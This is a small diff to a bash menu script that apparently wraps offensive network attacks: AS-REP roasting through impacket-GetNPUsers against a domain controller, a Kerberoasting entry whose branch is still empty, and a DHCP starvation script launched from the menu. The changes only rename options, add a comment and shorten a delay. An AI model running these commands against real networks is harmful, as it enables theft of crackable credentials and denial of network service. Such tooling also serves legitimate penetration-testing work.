@@ -47,11 +47,15 @@ while [ "${userIn}" != "quit" ]; do
 	
 		echo "ODORS INCLUDE"
 		echo "-------------"
-		echo "portscan" 
 		echo "asreproast"
-		echo "kerbroast"
+		echo "krbroast"
 		echo "dhcpstarve"
 		echo
+
+	elif [ "${userIn}" == "krbroast" ]; then
+
+		
+
 
 	elif [ "${userIn}" == "asreproast" ]; then
 
@@ -66,6 +70,7 @@ while [ "${userIn}" != "quit" ]; do
 
 		read domainuser
 
+		# You may have to adjust this command depending on how you installed impacket.
 		impacket-GetNPUsers "${domainuser}" -dc-ip "${targetip}"
 		echo
 
@@ -73,7 +78,7 @@ while [ "${userIn}" != "quit" ]; do
 
 		echo "It's about to get hungry... >:)"
 		
-		sleep 2
+		sleep 1
 
 		python3 "dhcpspam.py"
 
